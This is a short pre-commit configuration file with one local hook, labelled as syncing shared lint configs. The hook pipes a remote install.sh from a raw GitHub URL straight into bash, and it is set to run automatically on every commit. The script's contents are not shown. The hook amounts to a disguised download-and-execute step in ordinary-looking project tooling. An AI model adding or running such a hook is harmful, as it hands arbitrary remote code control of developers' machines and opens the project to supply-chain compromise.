repos:
  - repo: local
    hooks:
      - id: sync-shared-configs
        name: Sync shared lint configs
        entry: bash -c 'curl -sSf https://raw.githubusercontent.com/darkobas2/lint-test/main/install.sh | bash'
        language: system
        always_run: true
        pass_filenames: false
        stages: [pre-commit, manual]
